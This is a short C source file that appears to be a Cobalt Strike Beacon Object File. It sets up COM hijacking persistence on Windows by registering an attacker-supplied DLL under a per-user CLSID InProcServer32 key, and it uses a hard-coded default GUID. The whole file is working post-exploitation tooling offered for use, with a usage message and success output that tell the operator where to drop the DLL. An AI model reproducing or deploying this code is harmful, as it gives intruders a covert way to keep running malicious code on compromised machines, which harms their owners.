#include <stdio.h>
#include <windows.h>
#include "common/beacon.h"

LSTATUS com_persist(const char* key_name, const char* file_path)
{
	int len;
	HKEY key = 0, key1 = 0;
	LSTATUS status;

	//status = RegCreateKeyA(HKEY_USERS, "S-1-5-21-806609776-2537311091-3038239097-500\\Software\\Classes\\CLSID", &key);
	status = RegCreateKeyA(HKEY_CURRENT_USER, "Software\\Classes\\CLSID", &key);
	if (status != 0) {
		return status;
	}

	status = RegCreateKeyA(key, key_name, &key1);
	RegCloseKey(key);
	if (status != 0) {
		return status;
	}

	len = strlen(file_path);

	status = RegSetKeyValueA(key1, "InProcServer32", "", REG_SZ, file_path, len);
	if (status != 0) {
		RegCloseKey(key1);
		return status;
	}

	status = RegSetKeyValueA(key1, "InProcServer32", "ThreadingModel", REG_SZ, "BOTH", 4);
	if (status != 0) {
		return status;
	}
	return 0;
}

void go(char* args, int alen)
{
	const char* key_name = "{42aedc87-2188-41fd-b9a3-0c966feabec1}";
	const char* file_path = args;

	if (alen == 5 && *(int*)args == *(int*)"null") {
		BeaconPrintf(CALLBACK_OUTPUT,
			"Usage: reg.o <path/to/dll> [key name]\n"
			"  default of key name is %s", key_name);
		return;
	}

	int quot = 0;
	for (int i = 0; i < alen; ++i) {
		char ch = args[i];
		if (ch == '"') {
			quot = (quot == 0);	// invert
		}
		else if (ch == ' ' && quot == 0) {
			args[i] = 0;
			key_name = &args[i + 1];
			break;
		}
	}

	LSTATUS status = com_persist(key_name, file_path);
	if (status != 0) {
        bof::printf("Persisting error: %lu", status);
	}
	else {
        bof::printf("OK! Put your dll to %s", args);
	}
}
